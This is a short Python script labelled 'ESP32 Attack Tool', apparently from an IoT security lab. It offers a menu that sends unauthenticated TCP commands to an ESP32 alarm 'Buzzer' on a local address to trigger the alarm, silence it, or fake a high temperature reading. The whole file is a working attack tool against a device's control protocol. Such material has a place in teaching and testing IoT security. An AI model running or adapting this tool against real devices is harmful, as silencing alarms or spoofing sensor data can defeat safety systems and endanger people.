import socket
import time

# Configuration based on your findings
TARGET_IP = "192.168.0.103" # The Buzzer
TARGET_PORT = 80

def send_command(cmd):
    try:
        print(f"[*] Sending command: {cmd}")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((TARGET_IP, TARGET_PORT))
        s.sendall((cmd + "\n").encode()) # Add newline like the Arduino code expects
        response = s.recv(1024)
        print(f"[+] Response: {response.decode().strip()}")
        s.close()
    except Exception as e:
        print(f"[-] Error: {e}")

print("--- ESP32 Attack Tool ---")
print("1. Trigger Alarm")
print("2. Silence Alarm")
print("3. Fake Temperature (TEMP>50)")

while True:
    choice = input("\nSelect attack (1-3): ")
    
    if choice == '1':
        send_command("ALARM")
    elif choice == '2':
        send_command("CLEAR")
    elif choice == '3':
        send_command("TEMP:60")
    else:
        print("Invalid choice")
